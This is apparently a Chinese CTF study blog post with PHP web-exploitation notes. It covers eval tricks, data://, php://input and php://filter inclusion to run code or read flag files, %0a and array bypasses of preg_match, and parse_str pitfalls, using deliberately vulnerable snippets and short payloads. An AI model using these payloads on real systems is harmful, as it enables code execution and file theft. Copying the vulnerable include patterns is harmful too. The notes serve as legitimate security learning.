<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>不要捉弄我新人同学: A - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="不要捉弄我新人同学: A - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://example.com/2023/03/02/%E4%B8%8D%E8%A6%81%E6%8D%89%E5%BC%84%E6%88%91%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6%EF%BC%9AA/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-03-02T09:42:40.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/At-Dawn/">At Dawn</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>March</span>
            <span>2,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">不要捉弄我新人同学: A</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <p><strong>启语：算给自己看的，只能算一些干货，从刚入门到现在写了些，有时候懒没放进来，慢慢的都会放进来吧！</strong><br>伪协议总结参考：</p>
<h2 id="1-eval的一些小姿势？"><a href="#1-eval的一些小姿势？" class="headerlink" title="1.eval的一些小姿势？"></a>1.eval的一些小姿势？</h2><p>平常我们见到的eval都是形如<code>eval(system(&#39;ls&#39;);)</code>这样式儿的是吧<br>下面介绍一些变种</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">eval(system(&#x27;ls&#x27;)?&gt;)</span><br><span class="line">eval(?&gt;&lt;?<span class="attribute">php</span> system(<span class="string">&#x27;ls&#x27;</span>);?&gt;)</span><br><span class="line">eval(?&gt;&lt;?<span class="attribute">php</span> system(<span class="string">&#x27;ls&#x27;</span>);?&gt;;)</span><br><span class="line">eval(?&gt;&lt;?<span class="attribute">php</span> system(<span class="string">&#x27;ls&#x27;</span>);?&gt;&lt;?)</span><br><span class="line">eval(?&gt;&lt;?<span class="attribute">php</span> system(<span class="string">&#x27;ls&#x27;</span>);?&gt;&lt;?php;)</span><br></pre></td></tr></table></figure>

<h2 id="2-伪协议与文件包含函数的一些误区"><a href="#2-伪协议与文件包含函数的一些误区" class="headerlink" title="2.伪协议与文件包含函数的一些误区"></a>2.伪协议与文件包含函数的一些误区</h2><h3 id="data，input协议与Include和high-lightfile-show-source"><a href="#data，input协议与Include和high-lightfile-show-source" class="headerlink" title="data，input协议与Include和high_lightfile(show_source)"></a>data，input协议与Include和high_lightfile(show_source)</h3><h4 id="data协议"><a href="#data协议" class="headerlink" title="data协议"></a>data协议</h4><ul>
<li>条件<ul>
<li>allow_url_fopen:on</li>
<li>allow_url_include :on</li>
</ul>
</li>
</ul>
<p>	</p>
<p>就实际上我是有一个误区，没错说的就是你<br>不要误以为<code>data+文件包含函数</code>就是可以执行命令（刚入门的时候写的）<br>实际上能执行代码完全靠的是<code>include</code>的函数，而<code>highlight_file</code>这类的就完全不行！</p>
<ul>
<li>举个栗子！<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">  <span class="comment">#test test peace peace!</span></span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
这里是highlight_file对不对，我们输入一个data协议试试看<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662791699849-19bd4735-dee2-47cf-87ab-2f6eb3559445.png#averageHue=%23b9b9b9&clientId=uf2dd2243-0d19-4&from=paste&height=489&id=ayLmz&name=image.png&originHeight=611&originWidth=804&originalType=binary&ratio=1&rotation=0&showTitle=false&size=23019&status=done&style=none&taskId=u02187185-2551-4a70-b2ac-aa68b7e635e&title=&width=643.2" alt="image.png"><br>可以看出来这边儿，完完全全的没有运行，单单的是把指令显示出来了而已，这也凸显了<code>highlight_file</code>这个函数的作用，就是显示代码，并不具备解析作用<br>所以data伪协议也实际上可以看作是把这段代码存储到了file里面而已！<br>至于为什么能执行指令，<code>data+include</code>，由于include会解析文件，所以里面的指令被运行了！<br>我们把<code>highlight_file</code>更换成<code>include</code>可以发现运行了指令：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662791870598-beb1804d-98b8-4531-9bdd-f40b1eb96649.png#averageHue=%23ddd6b0&clientId=uf2dd2243-0d19-4&from=paste&height=511&id=v2MNL&name=image.png&originHeight=639&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=85097&status=done&style=none&taskId=ud138f576-9361-4201-a90b-54293357e37&title=&width=1536" alt="image.png"><br>完完整整的运行出来了，所以这归功与<code>include</code>的功劳</li>
</ul>
<h4 id="input协议"><a href="#input协议" class="headerlink" title="input协议"></a>input协议</h4><ul>
<li>条件<ul>
<li>allow_url_include :on	</li>
<li>allow_url_fopen:开关都可以</li>
</ul>
</li>
</ul>
<p>data与input基本一致，只不过<code>data</code>是以<code>get</code>方式向file储存代码，而<code>input</code>是以<code>post</code>方式去储存</p>
<p>注意：用input方法的话就不能去用hackbar的post（有小bug），得用<code>burpsuite</code>去传递post</p>
<ul>
<li>举个栗子<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="comment">#test test peace peace!</span></span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
代码和上面的基本一样，我们用的是<code>_include_</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662792310373-de0b0612-fc35-48f9-9a36-85ef860eae77.png#averageHue=%23fcfcfc&clientId=uf2dd2243-0d19-4&from=paste&height=428&id=JwNri&name=image.png&originHeight=535&originWidth=1371&originalType=binary&ratio=1&rotation=0&showTitle=false&size=43563&status=done&style=none&taskId=ue3fadc6c-0f90-4818-bbef-e8bcee4a5c8&title=&width=1096.8" alt="image.png"><br>可以看到如果用hackbar去传参一点反应都没有，具体原因是什么我来告诉你：<br>我们传一个<code>a=&lt;?php phpinfo();?&gt;</code>：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662792344885-ea30cc06-606d-4830-85c0-7466b32bcd21.png#averageHue=%23d6994f&clientId=uf2dd2243-0d19-4&from=paste&height=102&id=gqgWR&name=image.png&originHeight=127&originWidth=571&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6575&status=done&style=none&taskId=u5db2366d-a3ea-4920-b795-245a33e2faa&title=&width=456.8" alt="image.png"><br>在界面中出现了这个，可以发现我们输入的代码进去之后被url编码导致乱码无法识别，进而不能实现<br>这里也可以说明data和input的作用其实是一样的，都不是直接运行代码，而是<strong>依赖include</strong>去解析，界面中显示了a&#x3D;……..，就是最好的解释</li>
</ul>
<p>换成burpsuite去传递这个参数后：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662792443072-a45a4f72-5378-4953-a899-315172ac70b0.png#averageHue=%23c3a171&clientId=uf2dd2243-0d19-4&from=paste&height=324&id=y3yzd&name=image.png&originHeight=405&originWidth=1109&originalType=binary&ratio=1&rotation=0&showTitle=false&size=61746&status=done&style=none&taskId=uc95586f4-bbc9-4b4f-a78f-df9a147dc4f&title=&width=887.2" alt="image.png"></p>
<p>假如我们把include改成show_source或者是highlight_file的话：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662792511567-9e768091-00b1-4df3-90d9-b90c61abb12d.png#averageHue=%23f9f7f7&clientId=uf2dd2243-0d19-4&from=paste&height=330&id=OQ6KO&name=image.png&originHeight=412&originWidth=924&originalType=binary&ratio=1&rotation=0&showTitle=false&size=48404&status=done&style=none&taskId=ud6b187dd-717e-4a42-8828-f04e9f55145&title=&width=739.2" alt="image.png"><br>可以看到就只剩下了代码，和上面运行data协议一模一样</p>
<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>不难发现，其实data和input就是向参数中写入数据，再依赖include这一类函数去解析，最后运行代码<br>并不是什么直接运行代码哈哈哈哈，笑死我了为什么我之前一直认为会直接运行啊！</p>
<h3 id="filter协议"><a href="#filter协议" class="headerlink" title="filter协议"></a>filter协议</h3><p>filter协议用法就很熟悉，与data相反，filter是去读取文件，把文件的内容存入参数：</p>
<ul>
<li>通俗易懂的栗子：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="comment">#test test peace peace!</span></span><br><span class="line">        @<span class="title function_ invoke__">show_source</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
代码还是上面的代码：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662792698240-e8366657-cb72-48af-afd8-da2e64e1b221.png#averageHue=%23eceae3&clientId=uf2dd2243-0d19-4&from=paste&height=264&id=M24aQ&name=image.png&originHeight=330&originWidth=726&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22848&status=done&style=none&taskId=u4a1d3a8d-2302-42ee-8ab2-3bb533cb9e3&title=&width=580.8" alt="image.png"><br>可以看到显示出了我们flag.php里面的文件内容，原理和上面的data，input一样，只是将数据存入file这个变量里，并不是会直接显示在页面上</li>
</ul>
<p>我们把<code>show_source</code>换成<code>@file_get_contents</code>:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662792815868-1e814ef6-ab3e-49af-b346-ab0e517870a0.png#averageHue=%23656565&clientId=uf2dd2243-0d19-4&from=paste&height=355&id=ePkyX&name=image.png&originHeight=444&originWidth=1052&originalType=binary&ratio=1&rotation=0&showTitle=false&size=25327&status=done&style=none&taskId=u52af208d-e728-49e9-8315-181b8be5f74&title=&width=841.6" alt="image.png"><br>可以发现什么都没有<br>变成<code>echo @file_get_contents</code>后，查看网页源代码发现：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662792896021-274a1fd9-83a8-47b2-9c9c-61ab414ba63a.png#averageHue=%23f6f6f6&clientId=uf2dd2243-0d19-4&from=paste&height=102&id=Kt9ai&name=image.png&originHeight=128&originWidth=343&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2282&status=done&style=none&taskId=u23d8116e-e67c-4903-a4f1-5f20397c504&title=&width=274.4" alt="image.png"><br>输出了内容</p>
<h4 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h4><p>所谓的什么伪协议流，其实就是读取文件或者写入内容到文件，并且储存到变量里面<br>不要搞混了哦</p>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="3-URL编码一些总结"><a href="#3-URL编码一些总结" class="headerlink" title="3.URL编码一些总结"></a>3.URL编码一些总结</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">特殊含义                                                    十六进制</span><br><span class="line"></span><br><span class="line">+      表示空格（在URL中不能使用空格）                          %2B</span><br><span class="line">空格   URL中的空格可以用+号或者编码                             %20</span><br><span class="line">/      分隔目录和子目录                                        %2F</span><br><span class="line">?      分隔实际的URL和参数                                     %3F</span><br><span class="line">#      表示书签                                               %23</span><br><span class="line">&amp;      URL中指定的参数间的分隔符                               %26</span><br><span class="line">=      URL中指定的参数的值                                    %3D  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">比如：http://www.xx.com/test/?name=admin&amp;passwd=123456     test目录下的name参数等于admin，passwd参数等于123456</span><br><span class="line"></span><br><span class="line">http://www.xx.com/?action=i+love+you            加号代替空格</span><br><span class="line">http://www.xx.com/?action=i%20love%20you        空格编码</span><br></pre></td></tr></table></figure>
<p>（1）在URL中，空格和单引号都会被编码，例如访问：<a target="_blank" rel="noopener" href="https://www.baidu.com/?id=1&name=%27xi">https://www.baidu.com/?id=1&name='xi</a> e’&amp;pass&#x3D;”密码”<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662866413150-e6a37d46-6929-49d6-80ed-df2fc428defe.png#averageHue=%23c9edf0&clientId=u496d9587-0424-4&from=paste&id=OA1h9&name=image.png&originHeight=58&originWidth=775&originalType=url&ratio=1&rotation=0&showTitle=false&size=7208&status=done&style=none&taskId=u9e7bee5c-ca21-4cef-91f1-d7a1f6b399c&title=" alt="image.png"><br>抓包是这样的，单引号，双引号、中文和空格都会被编码<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662866416456-ef45a235-a9ed-4865-a445-56f296ce5ccb.png#averageHue=%23f5f1f1&clientId=u496d9587-0424-4&from=paste&id=caFDO&name=image.png&originHeight=71&originWidth=917&originalType=url&ratio=1&rotation=0&showTitle=false&size=13236&status=done&style=none&taskId=u49ed47a2-6dc0-4689-8d0d-e7190b5c066&title=" alt="image.png"><br>（2）在我们的URL参数中有一个参数的值中包含了 &amp; 的话，则在URL中必须将 &amp; 给编码。例如我们的name参数的值是12&amp;dsfa 的话，我们在URL中则必须将&amp;给编码</p>
<p><a target="_blank" rel="noopener" href="https://www.baidu.com/?id=1&name=12&dsfa">https://www.baidu.com/?id=1&name=12&dsfa</a>   ，这里没将&amp;进行编码的话，浏览器则把12&amp;dsfa给拆开了<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662866425771-459dca91-a786-4866-bc88-bceb2bf30910.png#averageHue=%23f1f0f0&clientId=u496d9587-0424-4&from=paste&id=rF0vv&name=image.png&originHeight=72&originWidth=416&originalType=url&ratio=1&rotation=0&showTitle=false&size=7755&status=done&style=none&taskId=u3ff6a753-3194-4540-bd86-bbee0c1a4d7&title=" alt="image.png"><br><a target="_blank" rel="noopener" href="https://www.baidu.com/?id=1&name=12&dsfa">https://www.baidu.com/?id=1&name=12%26dsfa</a> ，这里将 &amp; 进行了编码，则浏览器将name的值解析为了 12&amp;dsfa<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662866460764-e326b1dd-39ba-44d3-bdc3-d7e20fd7c277.png#averageHue=%23f1eeee&clientId=u496d9587-0424-4&from=paste&id=Cmdmf&name=image.png&originHeight=72&originWidth=421&originalType=url&ratio=1&rotation=0&showTitle=false&size=9059&status=done&style=none&taskId=u35581559-d5f2-4ddf-acd7-6e36e6b5d32&title=" alt="image.png"></p>
<p>#号的作用</p>
<h1 id="代表网页中的一个位置。其右面的字符，就是该位置的标识符。比如，http-www-example-com-index-html-print就代表网页index-html的print位置。浏览器读取这个URL后，会自动将print位置滚动至可视区域。为网页位置指定标识符，有两个方法。一是使用锚点，比如，二是使用id属性，比如"><a href="#代表网页中的一个位置。其右面的字符，就是该位置的标识符。比如，http-www-example-com-index-html-print就代表网页index-html的print位置。浏览器读取这个URL后，会自动将print位置滚动至可视区域。为网页位置指定标识符，有两个方法。一是使用锚点，比如，二是使用id属性，比如" class="headerlink" title="代表网页中的一个位置。其右面的字符，就是该位置的标识符。比如，http://www.example.com/index.html#print就代表网页index.html的print位置。浏览器读取这个URL后，会自动将print位置滚动至可视区域。为网页位置指定标识符，有两个方法。一是使用锚点，比如，二是使用id属性，比如"></a>代表网页中的一个位置。其右面的字符，就是该位置的标识符。比如，<a target="_blank" rel="noopener" href="http://www.example.com/index.html#print">http://www.example.com/index.html#print</a>就代表网页index.html的print位置。浏览器读取这个URL后，会自动将print位置滚动至可视区域。为网页位置指定标识符，有两个方法。一是使用锚点，比如<a name="print"></a>，二是使用id属性，比如<div id="print"></h1><h2 id="4-扫盲之-0a绕过preg-match误区"><a href="#4-扫盲之-0a绕过preg-match误区" class="headerlink" title="4.扫盲之%0a绕过preg_match误区"></a>4.扫盲之%0a绕过preg_match误区</h2><p>今天以前，我还傻乎乎的觉得，看到了preg_match没加m，就可以换行符绕过！这不是天经地义吗！<br>然后到今天才知道自己的浅薄</p>
<h3 id="先浅浅的举个栗子"><a href="#先浅浅的举个栗子" class="headerlink" title="先浅浅的举个栗子"></a>先浅浅的举个栗子</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$str</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^flag/i&#x27;</span>, <span class="variable">$str</span>))&#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;yes&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662879016507-652307a8-0f5f-4936-8629-4e6d0a64ec1a.png#averageHue=%23fafae2&clientId=u82ad91e6-e5e7-4&from=paste&height=96&id=F4plv&name=image.png&originHeight=120&originWidth=508&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6396&status=done&style=none&taskId=ue039c792-9043-4890-b738-3bc476a8cb4&title=&width=406.4" alt="image.png"><br>诶？怎么回事是不是很好奇，不是说换行了就不会被匹配到吗？我想告诉你的是这是错误的想法<br>实际上<strong>并不是什么只会匹配第一行</strong>，这是一个错误的思想</p>
<h3 id="那我们说的“换行”是什么意思呢？"><a href="#那我们说的“换行”是什么意思呢？" class="headerlink" title="那我们说的“换行”是什么意思呢？"></a>那我们说的“换行”是什么意思呢？</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.flag/i&#x27;</span>, <span class="variable">$str</span>))&#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;yes&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>
<p>实际上意思是<strong>换行符不会被正则匹配中的”.”识别！</strong><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662879170837-a9a2ed4e-0b0b-4d94-8247-f5fee213c2a5.png#averageHue=%23cecece&clientId=u82ad91e6-e5e7-4&from=paste&height=146&id=TaHIE&name=image.png&originHeight=182&originWidth=846&originalType=binary&ratio=1&rotation=0&showTitle=false&size=76745&status=done&style=none&taskId=ubf8806e5-ebbb-47b0-bbbf-c941ec2c10d&title=&width=676.8" alt="image.png"><br>所以我们payload:?b&#x3D;%0aflag<br>这个%0a不会被正则识别所以达到了绕过！<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662879220856-e8366130-02f6-480e-8ba5-1017e2c2caae.png#averageHue=%23d2bea7&clientId=u82ad91e6-e5e7-4&from=paste&height=131&id=oFyMQ&name=image.png&originHeight=164&originWidth=674&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5905&status=done&style=none&taskId=u0c7ac678-e991-4ae9-960d-6fd1bf11ee8&title=&width=539.2" alt="image.png"><br>这次就没输出yes，说明正则匹配没匹配到！</p>
<h3 id="那我们正则匹配里的m的意思是什么？"><a href="#那我们正则匹配里的m的意思是什么？" class="headerlink" title="那我们正则匹配里的m的意思是什么？"></a>那我们正则匹配里的m的意思是什么？</h3><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662879332748-e13cde05-c5e2-4fe0-9151-e0302efa9afc.png#averageHue=%23f4f4f4&clientId=u82ad91e6-e5e7-4&from=paste&height=147&id=FvfIY&name=image.png&originHeight=184&originWidth=1109&originalType=binary&ratio=1&rotation=0&showTitle=false&size=95180&status=done&style=none&taskId=u4de4614c-5c47-4476-a64f-907f032f8d8&title=&width=887.2" alt="image.png"><br>在这里可以看到，<code>m</code>是一定要搭配<code>^</code>或者<code>$</code>来使用的，也就是说有m必须要有^或者$，否则无意义</p>
<ul>
<li>举个栗子<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^flag/im&#x27;</span>, <span class="variable">$str</span>))&#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;yes&#x27;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
我们payload:a%0aflag<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662879476764-e77b8eca-76f0-4b73-b63d-0ca570b8f060.png#averageHue=%23d1b99a&clientId=u82ad91e6-e5e7-4&from=paste&height=125&id=y4FGS&name=image.png&originHeight=156&originWidth=604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6534&status=done&style=none&taskId=u144cc2a4-8595-4ff1-b62e-dc9d7912623&title=&width=483.2" alt="image.png"><br>发现匹配到了，而flag明明不是首发<br>这更好的印证了m是以每个换行符<code>\n</code>为起始点去识别的<br>这里要说一下正则匹配<code>^flag</code>不是说以f字母开头的，是以flag开头的<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662879550038-cb687327-3827-4210-b9ef-393ba42a415f.png#averageHue=%23f5e4c6&clientId=u82ad91e6-e5e7-4&from=paste&height=102&id=TK8MH&name=image.png&originHeight=128&originWidth=607&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5719&status=done&style=none&taskId=u1b3c5545-d7f4-445d-a11f-4f453c09d83&title=&width=485.6" alt="image.png"><br>这样就匹配不到<br>而在非多行模式下，$似乎会忽略在句尾的%0a<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^flag$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>] !== <span class="string">&#x27;flag&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<code>?a=flag%0a</code></li>
</ul>
<h2 id="5-数组绕过preg-match"><a href="#5-数组绕过preg-match" class="headerlink" title="5.数组绕过preg_match"></a>5.数组绕过preg_match</h2><blockquote>
<p>md5(Array()) &#x3D; null<br>sha1(Array()) &#x3D; null<br>ereg(pattern,Array()) &#x3D; null<br>preg_match(pattern,Array()) &#x3D; false<br>strcmp(Array(), “abc”) &#x3D; null<br>strpos(Array(),”abc”) &#x3D; null<br>strlen(Array()) &#x3D; null</p>
</blockquote>
<h2 id="6-误区之parse-str"><a href="#6-误区之parse-str" class="headerlink" title="6.误区之parse_str"></a>6.误区之parse_str</h2><p>parse_str的官方介绍：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662969795048-41d4764b-0f63-45c1-8af1-f4e98e1aa42a.png#averageHue=%23fdfbfa&clientId=u78193326-e308-4&from=paste&height=381&id=EFpGS&name=image.png&originHeight=476&originWidth=662&originalType=binary&ratio=1&rotation=0&showTitle=false&size=41536&status=done&style=none&taskId=ube66132c-9fe9-46e6-a0bd-92ffcfdb367&title=&width=529.6" alt="image.png"><br>函数将字符串中的变量注册，分隔符就是<code>&amp;</code>和URL一模一样，那他有什么误区呢？<br>在做ctfshow的web134时发现了这个问题</p>
<ul>
<li>分析</li>
</ul>
<p>函数的分隔符&amp;不是你用URL传进去的，而是源代码里用URL，有点抽象我们来看个例子</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">get_defined_vars</span>())</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>
